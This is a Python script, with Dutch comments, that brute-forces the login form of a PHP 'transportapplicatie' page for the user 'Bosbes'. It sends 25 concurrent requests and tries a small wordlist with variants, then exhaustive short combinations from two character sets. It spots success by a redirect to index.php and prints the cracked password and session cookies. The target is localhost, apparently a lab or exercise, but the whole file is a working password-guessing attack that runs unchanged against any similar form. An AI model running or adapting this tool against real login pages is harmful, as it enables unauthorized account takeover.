import asyncio
import aiohttp
import itertools
import string
import time

URL = "http://localhost/transportapplicatie/authorisatie.php"
USERNAME = "Bosbes"

# Performance tuning
CONCURRENCY = 25
TIMEOUT = 5

# Slimme keuzes
MAX_BRUTE_LENGTH = 5
SMART_CHARSET = "aeioubstnrl123"
FALLBACK_CHARSET = string.ascii_lowercase + string.digits

BASE_WORDS = [
    "bse",
    "admin",
    "welkom",
    "test",
    "transport",
    "lol"
]

VARIANTS = [
    lambda w: w,
    lambda w: w + "1",
    lambda w: w + "123",
    lambda w: w.capitalize(),
    lambda w: w.upper(),
    lambda w: w + "!"
]

sem = asyncio.Semaphore(CONCURRENCY)
found = asyncio.Event()


async def attempt_login(session, password: str) -> bool:
    if found.is_set():
        return False

    async with sem:
        data = {
            "inlognaam": USERNAME,
            "wachtwoord": password,
            "submit": "login"
        }

        start = time.perf_counter()

        try:
            async with session.post(URL, data=data, timeout=TIMEOUT, allow_redirects=True) as resp:
                elapsed = time.perf_counter() - start
                text = await resp.text()

                print(f"Test '{password}' | {resp.status} | {elapsed:.3f}s")

                if resp.status != 200:
                    return False

                if "Helaas" in text:
                    return False

                if "index.php" in str(resp.url):
                    print(f"\n[✓] WACHTWOORD GEVONDEN: {password}")
                    print(f"[i] Response tijd: {elapsed:.3f}s")
                    print(f"[i] Cookies: {resp.cookies}")
                    found.set()
                    return True

        except asyncio.TimeoutError:
            return False

    return False


async def run_batch(session, passwords):
    tasks = [attempt_login(session, pw) for pw in passwords]
    results = await asyncio.gather(*tasks)
    return any(results)


async def main():
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)

    async with aiohttp.ClientSession(timeout=timeout) as session:

        print("\n[*] FASE 1 — Woordlijst + variaties")
        for word in BASE_WORDS:
            for variant in VARIANTS:
                if await attempt_login(session, variant(word)):
                    return

        print("\n[*] FASE 2 — Slimme brute-force")
        for length in range(1, MAX_BRUTE_LENGTH + 1):
            print(f"\n[*] Lengte {length}")
            batch = []

            for combo in itertools.product(SMART_CHARSET, repeat=length):
                batch.append("".join(combo))

                if len(batch) >= CONCURRENCY:
                    if await run_batch(session, batch):
                        return
                    batch.clear()

            if batch:
                if await run_batch(session, batch):
                    return

        print("\n[*] FASE 3 — Fallback brute-force (laatste redmiddel)")
        for length in range(1, 4):
            print(f"\n[*] Fallback lengte {length}")
            batch = []

            for combo in itertools.product(FALLBACK_CHARSET, repeat=length):
                batch.append("".join(combo))

                if len(batch) >= CONCURRENCY:
                    if await run_batch(session, batch):
                        return
                    batch.clear()

            if batch:
                if await run_batch(session, batch):
                    return

        print("\n[✗] Geen geldig wachtwoord gevonden")


asyncio.run(main())
